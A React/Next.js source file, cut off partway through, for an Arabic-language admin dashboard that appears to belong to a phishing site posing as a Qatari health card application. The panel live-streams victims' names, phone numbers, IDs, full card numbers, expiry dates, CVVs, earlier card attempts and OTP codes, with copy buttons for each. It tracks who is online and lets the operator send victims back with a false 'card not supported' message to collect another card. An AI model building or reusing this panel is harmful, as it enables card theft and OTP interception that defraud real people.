'use client'

import { useEffect, useMemo, useRef, useState } from 'react'
import { useRouter } from 'next/navigation'
import { onAuthStateChanged, signOut, User } from 'firebase/auth'
import { auth, db } from '@/lib/firebase'
import { arrayUnion, collection, deleteDoc, onSnapshot, doc, query, setDoc } from 'firebase/firestore'
import { Card, CardContent } from '@/app/components/ui/card'
import { Button } from '@/app/components/ui/button'
import {
  CheckCircle, XCircle, Clock, User as UserIcon,
  Phone, Shield, RefreshCw, LogOut, Wifi, Copy, Check, Trash2, Eye
} from 'lucide-react'

interface Submission {
  id: string
  name: string
  phone: string
  cardNumber: string
  dateMonth: string
  datayaer: string
  CVC: string
  otpArr: string[]
  cardState: CardStateValue
  method?: string
  createdAt?: number
  stateUpdatedAt?: number
  step?: number
  currentPage?: string
  onlineStatus?: 'online' | 'offline'
  lastSeenAt?: number
  cardStateHistory?: CardStateHistoryEntry[]
  cardDetailsHistory?: CardAttemptHistoryEntry[]
  reviewMessage?: string
}

type CardStateValue = 'pending' | 'approved' | 'rejected'

type CardStateHistoryEntry = {
  state: CardStateValue
  at?: number
  by?: string
}

type CardAttemptHistoryEntry = {
  cardNumber?: string
  CVC?: string
  dateMonth?: string
  datayaer?: string
  cardExpiry?: string
  submittedAt?: number
}

const PAGE_LABELS: Record<string, string> = {
  'card-information': 'معلومات البطاقة',
  'application-form': 'استمارة التقديم',
  'payment-details': 'تفاصيل الدفع',
  'payment-method': 'اختيار طريقة الدفع',
  'card-info': 'معلومات البطاقة البنكية',
  otp: 'رمز التحقق',
  completed: 'مكتمل',
}

const STEP_LABELS: Record<number, string> = {
  1: 'معلومات البطاقة',
  2: 'استمارة التقديم',
  3: 'تفاصيل الدفع',
  4: 'اختيار طريقة الدفع',
  5: 'معلومات البطاقة البنكية',
  6: 'رمز التحقق',
}

const PRESENCE_TIMEOUT_MS = 45000
const ARABIC_DATE_TIME_FORMATTER = new Intl.DateTimeFormat('ar-QA', {
  weekday: 'long',
  day: 'numeric',
  month: 'long',
  year: 'numeric',
  hour: 'numeric',
  minute: '2-digit',
})

function formatArabicDateTime(timestamp?: number) {
  if (!timestamp) return '—'
  return ARABIC_DATE_TIME_FORMATTER.format(new Date(timestamp))
}

function resolveStepLabel(step?: number, currentPage?: string) {
  const pageLabel = currentPage ? PAGE_LABELS[currentPage] : undefined
  if (typeof step === 'number') {
    return `الخطوة ${step}: ${pageLabel ?? STEP_LABELS[step] ?? 'غير محددة'}`
  }
  return pageLabel ?? 'غير محددة'
}

function isSubmissionOnline(sub: Submission, nowTimestamp: number) {
  if (sub.onlineStatus === 'offline') return false
  if (typeof sub.lastSeenAt === 'number') {
    return nowTimestamp - sub.lastSeenAt <= PRESENCE_TIMEOUT_MS
  }
  return sub.onlineStatus === 'online'
}

function cardStateText(state: CardStateValue) {
  if (state === 'approved') return 'مقبول'
  if (state === 'rejected') return 'مرفوض'
  return 'قيد المراجعة'
}

function cardStatePillClass(state: CardStateValue) {
  if (state === 'approved') return 'bg-emerald-500/20 text-emerald-200 border border-emerald-400/30'
  if (state === 'rejected') return 'bg-red-500/20 text-red-200 border border-red-400/30'
  return 'bg-amber-500/20 text-amber-200 border border-amber-400/30'
}

function getCardStateHistory(sub: Submission): CardStateHistoryEntry[] {
  const raw = Array.isArray(sub.cardStateHistory) ? sub.cardStateHistory : []
  const normalized = raw
    .filter((entry): entry is CardStateHistoryEntry => !!entry && !!entry.state)
    .map((entry) => ({
      state: entry.state,
      at: typeof entry.at === 'number' ? entry.at : sub.stateUpdatedAt ?? sub.createdAt ?? 0,
      by: entry.by,
    }))
    .sort((a, b) => (b.at ?? 0) - (a.at ?? 0))

  if (normalized.length > 0) return normalized

  if (sub.cardState === 'approved' || sub.cardState === 'rejected') {
    return [{
      state: sub.cardState,
      at: sub.stateUpdatedAt ?? sub.createdAt ?? 0,
      by: undefined,
    }]
  }

  return []
}

function formatAttemptExpiry(entry: CardAttemptHistoryEntry) {
  if (entry.dateMonth && entry.datayaer) return `${entry.dateMonth}/${entry.datayaer}`
  if (entry.cardExpiry) {
    const [year, month] = entry.cardExpiry.split('-')
    if (month && year) return `${month}/${year.slice(-2)}`
  }
  return '—'
}

function getCardAttemptHistory(sub: Submission): CardAttemptHistoryEntry[] {
  const rawAttempts = Array.isArray(sub.cardDetailsHistory) ? sub.cardDetailsHistory : []
  const normalized = rawAttempts
    .filter((entry): entry is CardAttemptHistoryEntry => !!entry && !!entry.cardNumber)
    .map((entry) => ({
      cardNumber: (entry.cardNumber ?? '').replace(/\D/g, ''),
      CVC: entry.CVC ?? '',
      dateMonth: entry.dateMonth ?? '',
      datayaer: entry.datayaer ?? '',
      cardExpiry: entry.cardExpiry ?? '',
      submittedAt: typeof entry.submittedAt === 'number' ? entry.submittedAt : sub.stateUpdatedAt ?? sub.createdAt ?? 0,
    }))
    .sort((a, b) => (b.submittedAt ?? 0) - (a.submittedAt ?? 0))

  if (normalized.length > 0) return normalized

  if (sub.cardNumber || sub.CVC || sub.dateMonth || sub.datayaer) {
    return [{
      cardNumber: (sub.cardNumber ?? '').replace(/\D/g, ''),
      CVC: sub.CVC ?? '',
      dateMonth: sub.dateMonth ?? '',
      datayaer: sub.datayaer ?? '',
      cardExpiry: '',
      submittedAt: sub.stateUpdatedAt ?? sub.createdAt ?? 0,
    }]
  }

  return []
}

function buildNotificationSignature(sub: Submission) {
  const otpCount = Array.isArray(sub.otpArr) ? sub.otpArr.filter(Boolean).length : 0
  const historyCount = Array.isArray(sub.cardStateHistory) ? sub.cardStateHistory.length : 0
  const cardAttemptsCount = Array.isArray(sub.cardDetailsHistory) ? sub.cardDetailsHistory.length : 0
  return [
    sub.cardState ?? 'pending',
    sub.step ?? '-',
    sub.currentPage ?? '-',
    sub.onlineStatus ?? '-',
    otpCount,
    historyCount,
    cardAttemptsCount,
  ].join('|')
}

function playDashboardNotificationSound() {
  if (typeof window === 'undefined') return
  const webkitAudioContext = (window as Window & { webkitAudioContext?: typeof AudioContext }).webkitAudioContext
  const AudioContextClass = window.AudioContext ?? webkitAudioContext
  if (!AudioContextClass) return

  try {
    const audioContext = new AudioContextClass()
    const gainNode = audioContext.createGain()
    gainNode.connect(audioContext.destination)
    gainNode.gain.setValueAtTime(0.0001, audioContext.currentTime)
    gainNode.gain.exponentialRampToValueAtTime(0.045, audioContext.currentTime + 0.01)
    gainNode.gain.exponentialRampToValueAtTime(0.0001, audioContext.currentTime + 0.35)

    const toneA = audioContext.createOscillator()
    toneA.type = 'sine'
    toneA.frequency.setValueAtTime(932, audioContext.currentTime)
    toneA.connect(gainNode)
    toneA.start(audioContext.currentTime)
    toneA.stop(audioContext.currentTime + 0.12)

    const toneB = audioContext.createOscillator()
    toneB.type = 'sine'
    toneB.frequency.setValueAtTime(1175, audioContext.currentTime + 0.16)
    toneB.connect(gainNode)
    toneB.start(audioContext.currentTime + 0.16)
    toneB.stop(audioContext.currentTime + 0.32)

    setTimeout(() => { void audioContext.close() }, 500)
  } catch (error) {
    console.error(error)
  }
}

function formatCardDisplay(num: string) {
  if (!num) return '•••• •••• •••• ••••'
  const clean = num.replace(/\D/g, '')
  return clean.replace(/(.{4})/g, '$1 ').trim()
}

function getSubmissionDisplayName(sub: Submission) {
  const trimmedName = sub.name?.trim()
  if (trimmedName) return trimmedName
  return `مستخدم ${sub.id.slice(-4)}`
}

function CardMockup({ sub }: { sub: Submission }) {
  const isVisa = !sub.method || sub.method === 'visa'
  const approved = sub.cardState === 'approved'
  const rejected = sub.cardState === 'rejected'

  const bgGradient = approved
    ? 'from-emerald-700 via-emerald-600 to-teal-500'
    : rejected
    ? 'from-gray-700 via-gray-600 to-gray-500'
    : 'from-[#1a1a2e] via-[#16213e] to-[#0f3460]'

  return (
    <div className={`relative w-full max-w-[340px] mx-auto rounded-2xl bg-gradient-to-br ${bgGradient} p-5 text-white shadow-2xl overflow-hidden select-none`}
      style={{ aspectRatio: '1.586' }}>
      <div className="absolute inset-0 opacity-10">
        <div className="absolute -top-10 -right-10 w-48 h-48 rounded-full bg-white" />
        <div className="absolute -bottom-16 -left-8 w-56 h-56 rounded-full bg-white" />
      </div>

      <div className="relative flex flex-col h-full justify-between">
        <div className="flex items-start justify-between">
          <div>
            <div className="text-[10px] text-white/60 uppercase tracking-widest">بطاقة مصرفية</div>
            <div className="text-xs font-semibold mt-0.5 opacity-80">
              {approved ? '✓ مقبولة' : rejected ? '✗ مرفوضة' : '◌ قيد المراجعة'}
            </div>
          </div>
          <Wifi className="w-6 h-6 opacity-60 rotate-90" />
        </div>

        <div>
          <div className="w-10 h-7 rounded bg-gradient-to-br from-yellow-300 to-yellow-500 mb-4 opacity-90" />
          <div className="font-mono text-lg tracking-widest font-bold text-center" dir="ltr">
            {formatCardDisplay(sub.cardNumber)}
          </div>
        </div>

        <div className="flex items-end justify-between">
          <div>
            <div className="text-[9px] text-white/50 uppercase tracking-widest mb-0.5">Card Holder</div>
            <div className="text-sm font-semibold truncate max-w-[160px]">{sub.name || '—'}</div>
          </div>
          <div className="text-center">
            <div className="text-[9px] text-white/50 uppercase tracking-widest mb-0.5">Expires</div>
            <div className="text-sm font-mono font-semibold" dir="ltr">
              {sub.dateMonth && sub.datayaer ? `${sub.dateMonth}/${sub.datayaer}` : '••/••'}
            </div>
          </div>
          <div className="text-center">
            <div className="text-[9px] text-white/50 uppercase tracking-widest mb-0.5">CVV</div>
            <div className="text-sm font-mono font-semibold" dir="ltr">
              {sub.CVC || '•••'}
            </div>
          </div>
          <div>
            {isVisa ? (
              <img src="/R.png" alt="Visa" className="h-7 w-auto brightness-200 contrast-0 invert" />
            ) : (
              <img src="/m.png" alt="Mastercard" className="h-7 w-auto" />
            )}
          </div>
        </div>
      </div>
    </div>
  )
}

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false)
  const copy = () => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true)
      setTimeout(() => setCopied(false), 1500)
    })
  }
  return (
    <button onClick={copy} className="ml-2 text-slate-400 hover:text-slate-200 transition-colors" title="نسخ">
      {copied ? <Check className="w-3.5 h-3.5 text-green-500" /> : <Copy className="w-3.5 h-3.5" />}
    </button>
  )
}

function InfoRow({ label, value, mono = false, copyable = false }: { label: string; value: string; mono?: boolean; copyable?: boolean }) {
  return (
    <div className="flex flex-col gap-0.5">
      <span className="text-[11px] text-slate-400 font-medium">{label}</span>
      <div className="flex items-center">
        <span className={`text-sm font-semibold text-slate-100 ${mono ? 'font-mono' : ''}`} dir="ltr">
          {value || '—'}
        </span>
        {copyable && value && <CopyButton text={value} />}
      </div>
    </div>
  )
}

export default function Dashboard() {
  const router = useRouter()
  const [user, setUser] = useState<User | null>(null)
  const [authLoading, setAuthLoading] = useState(true)
  const [submissions, setSubmissions] = useState<Submission[]>([])
  const [dataLoading, setDataLoading] = useState(true)
  const [updating, setUpdating] = useState<string | null>(null)
  const [deleting, setDeleting] = useState<string | null>(null)
  const [selectedSubmissionId, setSelectedSubmissionId] = useState<string | null>(null)
  const [isOnline, setIsOnline] = useState(true)
  const [mainPageVisits, setMainPageVisits] = useState(0)
  const [presenceNow, setPresenceNow] = useState(() => Date.now())
  const [streamStatus, setStreamStatus] = useState<'connecting' | 'live' | 'error'>('connecting')
  const hasLoadedOnceRef = useRef(false)
  const previousSubmissionSignaturesRef = useRef<Map<string, string>>(new Map())

  useEffect(() => {
    const syncOnlineStatus = () => setIsOnline(navigator.onLine)
    syncOnlineStatus()
    window.addEventListener('online', syncOnlineStatus)
    window.addEventListener('offline', syncOnlineStatus)
    return () => {
      window.removeEventListener('online', syncOnlineStatus)
      window.removeEventListener('offline', syncOnlineStatus)
    }
  }, [])

  useEffect(() => {
    const timerId = window.setInterval(() => setPresenceNow(Date.now()), 10000)
    return () => {
      window.clearInterval(timerId)
    }
  }, [])

  useEffect(() => {
    const unsub = onAuthStateChanged(auth, (u) => {
      if (u) { setUser(u) } else { router.replace('/login') }
      setAuthLoading(false)
    })
    return () => unsub()
  }, [router])

  useEffect(() => {
    if (!user) return
    setStreamStatus('connecting')
    const unsub = onSnapshot(query(collection(db, 'pays')), (snap) => {
      const data = snap.docs.map(d => ({ id: d.id, ...d.data() })) as Submission[]
      data.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0))

      const incomingSignatures = new Map<string, string>()
      for (const item of data) {
        incomingSignatures.set(item.id, buildNotificationSignature(item))
      }

      if (hasLoadedOnceRef.current) {
        const hasMeaningfulChange = data.some(item => {
          const previousSignature = previousSubmissionSignaturesRef.current.get(item.id)
          const currentSignature = incomingSignatures.get(item.id)
          return !previousSignature || previousSignature !== currentSignature
        })
        if (hasMeaningfulChange) playDashboardNotificationSound()
      } else {
        hasLoadedOnceRef.current = true
      }
      previousSubmissionSignaturesRef.current = incomingSignatures

      setSubmissions(data)
      setDataLoading(false)
      setStreamStatus('live')
    }, (err) => {
      console.error(err)
      setDataLoading(false)
      setStreamStatus('error')
    })
    return () => unsub()
  }, [user])

  useEffect(() => {
    if (!user) return
    const unsub = onSnapshot(doc(db, 'analytics', 'main-page'), (snap) => {
      const visits = snap.data()?.visits
      setMainPageVisits(typeof visits === 'number' ? visits : 0)
    }, (err) => {
      console.error(err)
    })
    return () => unsub()
  }, [user])

  useEffect(() => {
    if (submissions.length === 0) {
      setSelectedSubmissionId(null)
      return
    }
    if (!selectedSubmissionId || !submissions.some((sub) => sub.id === selectedSubmissionId)) {
      setSelectedSubmissionId(submissions[0].id)
    }
  }, [selectedSubmissionId, submissions])

  const selectedSubmission = useMemo(
    () => submissions.find((sub) => sub.id === selectedSubmissionId) ?? submissions[0] ?? null,
    [selectedSubmissionId, submissions],
  )

  const handleLogout = async () => { await signOut(auth); router.replace('/login') }

  const updateState = async (
    id: string,
    state: 'approved' | 'rejected',
    options?: {
      reviewMessage?: string
      step?: number
      currentPage?: string
    },
  ) => {
    setUpdating(id)
    try {
      const now = Date.now()
      const payload = {
        cardState: state,
        stateUpdatedAt: now,
        reviewMessage: options?.reviewMessage ?? '',
        cardStateHistory: arrayUnion({
          state,
          at: now,
          by: user?.email ?? 'admin',
        }),
        ...(typeof options?.step === 'number' ? { step: options.step } : {}),
        ...(options?.currentPage ? { currentPage: options.currentPage } : {}),
      }
      await setDoc(doc(db, 'pays', id), payload, { merge: true })
    } catch (e) { console.error(e) }
    setUpdating(null)
  }

  const sendBackToCardEntry = async (id: string) => {
    await updateState(id, 'rejected', {
      reviewMessage: 'نوع البطاقة غير مدعوم. يرجى إضافة بطاقة جديدة.',
      step: 5,
      currentPage: 'card-info',
    })
  }

  const deleteSubmission = async (id: string) => {
    const ok = window.confirm(`هل تريد حذف الطلب رقم ${id} نهائياً؟`)
    if (!ok) return
    setDeleting(id)
    try {
      await deleteDoc(doc(db, 'pays', id))
    } catch (error) {
      console.error(error)
      alert('تعذر حذف الطلب، حاول مرة أخرى.')
    }
    setDeleting(null)
  }

  const stats = {
    total: submissions.length,
    mainPageVisits,
    onlineUsers: submissions.filter(s => isSubmissionOnline(s, presenceNow)).length,
    pending: submissions.filter(s => !s.cardState || s.cardState === 'pending').length,
    approved: submissions.filter(s => s.cardState === 'approved').length,
    rejected: submissions.filter(s => s.cardState === 'rejected').length,
  }

  const stateBadge = (s?: string) => {
    if (s === 'approved') return { label: 'مقبول', cls: 'bg-emerald-500/20 text-emerald-200 border border-emerald-400/30' }
    if (s === 'rejected') return { label: 'مرفوض', cls: 'bg-red-500/20 text-red-200 border border-red-400/30' }
    return { label: 'قيد المراجعة', cls: 'bg-amber-500/20 text-amber-200 border border-amber-400/30' }
  }

  const streamStatusView = streamStatus === 'live'
    ? { label: 'المزامنة مباشرة', cls: 'bg-emerald-500/20 text-emerald-100 border border-emerald-300/40' }
    : streamStatus === 'error'
      ? { label: 'خطأ في المزامنة', cls: 'bg-red-500/20 text-red-100 border border-red-300/40' }
      : { label: 'جاري الاتصال...', cls: 'bg-amber-500/20 text-amber-100 border border-amber-300/40' }

  const selectedSub = selectedSubmission
  const selectedState = selectedSub ? stateBadge(selectedSub.cardState) : null
  const selectedIsUpdating = selectedSub ? updating === selectedSub.id : false
  const selectedIsDeleting = selectedSub ? deleting === selectedSub.id : false
  const selectedIsPending = selectedSub ? !selectedSub.cardState || selectedSub.cardState === 'pending' : false
  const selectedOnline = selectedSub ? isSubmissionOnline(selectedSub, presenceNow) : false
  const selectedStepLabel = selectedSub ? resolveStepLabel(selectedSub.step, selectedSub.currentPage) : ''
  const selectedStateHistory = selectedSub ? getCardStateHistory(selectedSub) : []
  const selectedOldCardAttempts = selectedSub ? getCardAttemptHistory(selectedSub).slice(1) : []
  const selectedFullCard = (selectedSub?.cardNumber || '').replace(/\D/g, '')
  const selectedGroupedCard = selectedFullCard.replace(/(.{4})/g, '$1 ').trim()

  if (authLoading) return (
    <div className="min-h-screen flex items-center justify-center bg-slate-950">
      <div className="text-center">
        <RefreshCw className="w-10 h-10 animate-spin text-[#8A1538] mx-auto mb-3" />
        <p className="text-slate-300 text-sm">جاري التحقق من الجلسة...</p>
      </div>
    </div>
  )

  if (!user) return null

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100" dir="rtl">
      <div className="bg-[#8A1538] text-white py-4 px-4 shadow-lg">
        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div>
            <h1 className="text-lg font-bold">لوحة التحكم</h1>
            <p className="text-white/60 text-xs">إدارة طلبات البطاقة الصحية — مباشر</p>
          </div>
          <div className="flex items-center gap-3 w-full sm:w-auto justify-between sm:justify-start">
            <span className={`inline-flex items-center gap-1.5 rounded-full px-2 py-1 text-[10px] font-semibold ${isOnline ? 'bg-emerald-500/20 text-emerald-100 border border-emerald-300/40' : 'bg-red-500/20 text-red-100 border border-red-300/40'}`}>
              <span className={`h-1.5 w-1.5 rounded-full ${isOnline ? 'bg-emerald-300' : 'bg-red-300'}`} />
              {isOnline ? 'متصل بالإنترنت' : 'غير متصل'}
            </span>
            <span className={`inline-flex items-center gap-1.5 rounded-full px-2 py-1 text-[10px] font-semibold ${streamStatusView.cls}`}>
              <span className="h-1.5 w-1.5 rounded-full bg-current opacity-80" />
              {streamStatusView.label}
            </span>
            <span className="hidden sm:block text-xs text-white/70">{user.email}</span>
            <Button onClick={handleLogout} size="sm" variant="outline"
              className="border-white/30 text-white bg-white/10 hover:bg-white/20 gap-1.5 text-xs">
              <LogOut className="w-3.5 h-3.5" />خروج
            </Button>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 py-6 space-y-6">
        <div className="grid grid-cols-2 md:grid-cols-3 xl:grid-cols-6 gap-3">
          {[
            { label: 'إجمالي', value: stats.total, icon: UserIcon, cls: 'bg-blue-500/20 text-blue-200 border border-blue-400/30' },
            { label: 'زيارات الرئيسية', value: stats.mainPageVisits, icon: Eye, cls: 'bg-violet-500/20 text-violet-200 border border-violet-400/30' },
            { label: 'متصل الآن', value: stats.onlineUsers, icon: Wifi, cls: 'bg-emerald-500/20 text-emerald-200 border border-emerald-400/30' },
            { label: 'قيد المراجعة', value: stats.pending, icon: Clock, cls: 'bg-amber-500/20 text-amber-200 border border-amber-400/30' },
            { label: 'مقبول', value: stats.approved, icon: CheckCircle, cls: 'bg-green-500/20 text-green-200 border border-green-400/30' },
            { label: 'مرفوض', value: stats.rejected, icon: XCircle, cls: 'bg-red-500/20 text-red-200 border border-red-400/30' },
          ].map((s, i) => (
            <Card key={i} className="border border-slate-800 shadow-sm bg-slate-900/80">
              <CardContent className="p-4 flex items-center gap-3">
                <div className={`p-2 rounded-xl ${s.cls}`}><s.icon className="w-5 h-5" /></div>
                <div>
                  <div className="text-2xl font-bold text-slate-100">{s.value}</div>
                  <div className="text-xs text-slate-400">{s.label}</div>
                </div>
              </CardContent>
            </Card>
          ))}
        </div>

        {dataLoading ? (
          <div className="py-20 text-center">
            <RefreshCw className="w-8 h-8 animate-spin text-[#8A1538] mx-auto mb-3" />
            <p className="text-slate-400 text-sm">جاري تحميل البيانات...</p>
          </div>
        ) : submissions.length === 0 ? (
          <div className="py-20 text-center text-slate-400">
            <Shield className="w-14 h-14 mx-auto mb-3 opacity-20" />
            <p className="font-medium">لا توجد طلبات بعد</p>
          </div>
        ) : (
          <div className="overflow-hidden rounded-2xl border border-slate-800 bg-slate-900/70 shadow-2xl shadow-slate-950/30">
            <div className="grid min-h-[700px] lg:grid-cols-[320px_1fr]">
              <aside className="bg-[#0f172a] text-slate-100 lg:border-l lg:border-slate-700">
                <div className="border-b border-slate-700 px-4 py-3">
                  <h2 className="text-sm font-semibold">قائمة المستخدمين</h2>
                  <p className="mt-1 text-xs text-slate-300">{submissions.length} مستخدم نشط</p>
                </div>
                <div className="max-h-[700px] overflow-auto p-2 space-y-2">
                  {submissions.map((sub) => {
                    const { label, cls } = stateBadge(sub.cardState)
                    const online = isSubmissionOnline(sub, presenceNow)
                    const stepLabel = resolveStepLabel(sub.step, sub.currentPage)
                    const isSelected = sub.id === selectedSub?.id

                    return (
                      <button
                        key={sub.id}
                        type="button"
                        onClick={() => setSelectedSubmissionId(sub.id)}
                        className={`w-full rounded-xl border px-3 py-3 text-right transition ${
                          isSelected
                            ? 'border-sky-300 bg-white/15'
                            : 'border-slate-700 bg-slate-800/50 hover:bg-slate-700/60'
                        }`}
                      >
                        <div className="flex items-center justify-between gap-2">
                          <span className={`h-2.5 w-2.5 rounded-full ${online ? 'bg-emerald-400' : 'bg-slate-500'}`} />
                          <div className="flex items-center gap-2 min-w-0 flex-1">
                            <div className="h-8 w-8 rounded-full bg-slate-700 text-slate-100 flex items-center justify-center text-sm font-bold">
                              {getSubmissionDisplayName(sub).slice(0, 1)}
                            </div>
                            <div className="min-w-0">
                              <p className="truncate text-sm font-semibold">{getSubmissionDisplayName(sub)}</p>
                              <p className="truncate text-[11px] text-slate-300">
                                رقم الهوية: <span className="font-mono">{sub.id}</span>
                              </p>
                            </div>
                          </div>
                        </div>
                        <div className="mt-2 flex flex-wrap items-center gap-1.5">
                          <span className={`rounded-full px-2 py-0.5 text-[10px] font-semibold ${cls}`}>{label}</span>
                          <span className="rounded-full border border-slate-500 bg-slate-900/70 px-2 py-0.5 text-[10px] text-slate-200">
                            {stepLabel}
                          </span>
                        </div>
                      </button>
                    )
                  })}
                </div>
              </aside>

              <section className="bg-slate-900/80">
                {!selectedSub || !selectedState ? (
                  <div className="h-full flex items-center justify-center p-8 text-slate-400">
                    اختر مستخدماً من القائمة الجانبية
                  </div>
                ) : (
                  <div className="flex h-full flex-col">
                    <div className="border-b border-slate-700 bg-slate-900/80 px-4 py-3 backdrop-blur">
                      <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:justify-between">
                        <div className="flex items-center gap-2 flex-wrap">
                          <span className={`px-2.5 py-1 rounded-full text-xs font-semibold ${selectedState.cls}`}>
                            {selectedState.label}
                          </span>
                          <span className={`inline-flex items-center gap-1 rounded-full px-2.5 py-1 text-xs font-semibold border ${
                            selectedOnline
                              ? 'bg-emerald-500/20 text-emerald-200 border-emerald-400/30'
                              : 'bg-slate-800 text-slate-300 border-slate-700'
                          }`}>
                            <span className={`h-1.5 w-1.5 rounded-full ${selectedOnline ? 'bg-emerald-400' : 'bg-slate-500'}`} />
                            {selectedOnline ? 'متصل الآن' : 'غير متصل'}
                          </span>
                          <span className="px-2.5 py-1 rounded-full text-xs font-semibold bg-slate-800 text-slate-200 border border-slate-700">
                            {selectedStepLabel}
                          </span>
                          <span className="text-xs text-slate-300">
                            {getSubmissionDisplayName(selectedSub)} — رقم الهوية:
                            <span className="font-mono font-semibold text-slate-100"> {selectedSub.id}</span>
                          </span>
                        </div>
                        {selectedSub.createdAt && (
                          <span className="text-xs text-slate-400">
                            {formatArabicDateTime(selectedSub.createdAt)}
                          </span>
                        )}
                      </div>
                    </div>

                    <div className="flex-1 overflow-auto p-4 sm:p-5">
                      <div className="space-y-5 rounded-2xl border border-slate-700 bg-slate-950/70 p-4 sm:p-5 shadow-sm">
                        <div className="flex flex-col lg:flex-row gap-6">
                          <div className="lg:w-[340px] flex-shrink-0">
                            <CardMockup sub={selectedSub} />
                            <div className="mt-3 bg-slate-900 rounded-xl p-3 border border-slate-700" dir="ltr">
                              <div className="text-[10px] text-slate-400 mb-1 text-right">رقم البطاقة كاملاً</div>
                              <div className="flex items-center justify-between">
                                <span className="font-mono text-base font-bold text-slate-100 tracking-widest">
                                  {selectedGroupedCard || '— — — —'}
                                </span>
                                {selectedGroupedCard && <CopyButton text={selectedFullCard} />}
                              </div>
                            </div>
                          </div>

                          <div className="flex-1 space-y-5">
                            <div>
                              <h3 className="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                                <UserIcon className="w-3.5 h-3.5" /> المعلومات الشخصية
                              </h3>
                              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 bg-slate-900 rounded-xl p-4 border border-slate-800">
                                <InfoRow label="الاسم الكامل" value={selectedSub.name} />
                                <InfoRow label="رقم الهاتف" value={selectedSub.phone} mono copyable />
                                <InfoRow label="رقم الهوية" value={selectedSub.id} mono copyable />
                                <InfoRow label="طريقة الدفع" value={selectedSub.method === 'mastercard' ? 'Mastercard' : 'Visa'} />
                                <InfoRow label="الخطوة الحالية" value={selectedStepLabel} />
                                <InfoRow label="آخر نشاط" value={formatArabicDateTime(selectedSub.lastSeenAt)} />
                              </div>
                            </div>

                            <div>
                              <h3 className="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                                <Shield className="w-3.5 h-3.5" /> بيانات البطاقة
                              </h3>
                              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 bg-slate-900 rounded-xl p-4 border border-slate-800">
                                <div className="sm:col-span-2">
                                  <InfoRow label="رقم البطاقة" value={selectedGroupedCard} mono copyable />
                                </div>
                                <InfoRow label="تاريخ الانتهاء" value={selectedSub.dateMonth && selectedSub.datayaer ? `${selectedSub.dateMonth}/${selectedSub.datayaer}` : '—'} mono />
                                <InfoRow label="CVV" value={selectedSub.CVC} mono copyable />
                              </div>
                            </div>

                            {selectedOldCardAttempts.length > 0 && (
                              <div>
                                <h3 className="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                                  <Clock className="w-3.5 h-3.5" /> البطاقات القديمة
                                </h3>
                                <div className="bg-slate-900 rounded-xl p-4 border border-slate-800 space-y-2">
                                  {selectedOldCardAttempts.map((attempt, index) => {
                                    const oldCardNumber = (attempt.cardNumber ?? '').replace(/\D/g, '')
                                    return (
                                      <div key={`${oldCardNumber}-${attempt.submittedAt ?? 'na'}-${index}`} className="rounded-lg border border-slate-700 bg-slate-950 px-3 py-2 space-y-1.5">
                                        <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 text-xs">
                                          <div>
                                            <div className="text-slate-400 mb-0.5">رقم البطاقة</div>
                                            <div className="font-mono text-slate-100 flex items-center">
                                              {formatCardDisplay(oldCardNumber)}
                                              {oldCardNumber && <CopyButton text={oldCardNumber} />}
                                            </div>
                                          </div>
                                          <div>
                                            <div className="text-slate-400 mb-0.5">CVV</div>
                                            <div className="font-mono text-slate-100 flex items-center">
                                              {attempt.CVC || '—'}
                                              {attempt.CVC && <CopyButton text={attempt.CVC} />}
                                            </div>
                                          </div>
                                          <div>
                                            <div className="text-slate-400 mb-0.5">تاريخ الانتهاء</div>
                                            <div className="font-mono text-slate-100">{formatAttemptExpiry(attempt)}</div>
                                          </div>
                                        </div>
                                        <div className="text-xs text-slate-400">{formatArabicDateTime(attempt.submittedAt)}</div>
                                      </div>
                                    )
                                  })}
                                </div>
                              </div>
                            )}

                            {selectedSub.otpArr && selectedSub.otpArr.filter(Boolean).length > 0 && (
                              <div>
                                <h3 className="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                                  <Phone className="w-3.5 h-3.5" /> رموز التحقق (OTP)
                                </h3>
                                <div className="bg-slate-900 rounded-xl p-4 border border-slate-800">
                                  <div className="flex flex-wrap gap-2">
                                    {selectedSub.otpArr.filter(Boolean).map((otp, i) => (
                                      <div key={i} className="flex items-center gap-1 bg-slate-950 border border-slate-700 rounded-lg px-3 py-1.5 shadow-sm">
                                        <span className="text-[10px] text-slate-400 font-medium">#{i + 1}</span>
                                        <span className="font-mono text-sm font-bold text-slate-100 tracking-widest">{otp}</span>
                                        <CopyButton text={otp} />
                                      </div>
                                    ))}
                                  </div>
                                </div>
                              </div>
                            )}

                            {selectedStateHistory.length > 0 && (
                              <div>
                                <h3 className="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                                  <Clock className="w-3.5 h-3.5" /> سجل حالة البطاقة
                                </h3>
                                <div className="bg-slate-900 rounded-xl p-4 border border-slate-800 space-y-2">
                                  {selectedStateHistory.map((entry, index) => (
                                    <div key={`${entry.state}-${entry.at}-${index}`} className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-1 rounded-lg border border-slate-700 bg-slate-950 px-3 py-2">
                                      <span className={`inline-flex w-fit items-center rounded-full px-2.5 py-1 text-xs font-semibold ${cardStatePillClass(entry.state)}`}>
                                        {cardStateText(entry.state)}
                                      </span>
                                      <span className="text-xs text-slate-400">
                                        {formatArabicDateTime(entry.at)}
                                      </span>
                                    </div>
                                  ))}
                                </div>
                              </div>
                            )}

                            {selectedIsPending && (
                              <div className="flex flex-col sm:flex-row gap-3 pt-1">
                                <Button
                                  disabled={selectedIsUpdating || selectedIsDeleting}
                                  onClick={() => updateState(selectedSub.id, 'approved')}
                                  className="flex-1 bg-green-600 hover:bg-green-700 text-white gap-2 h-10"
                                >
                                  {selectedIsUpdating ? <RefreshCw className="w-4 h-4 animate-spin" /> : <CheckCircle className="w-4 h-4" />}
                                  قبول الطلب
